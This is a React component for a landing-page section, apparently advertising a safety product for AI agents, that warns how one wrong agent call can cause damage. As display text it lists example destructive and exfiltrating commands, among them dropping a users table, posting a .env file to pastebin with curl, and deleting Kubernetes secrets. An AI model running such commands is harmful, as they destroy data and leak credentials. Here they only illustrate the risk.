export function Threat() {
  return (
    <section className="section lp lp-statement" id="threat">
      <div className="container">
        <p className="eyebrow"><span className="ix">01</span>The threat</p>
        <h2 className="big">One bad inference<br />drops the table.</h2>
        <p className="sub">Agents run shell, hit APIs, and touch databases. One wrong call is all it takes.</p>
        <div className="cmd-band">
          <code>DROP TABLE users</code>
          <code>curl -d @.env pastebin.com</code>
          <code>kubectl delete secret</code>
          <code>token → private host</code>
        </div>
      </div>
    </section>
  )
}
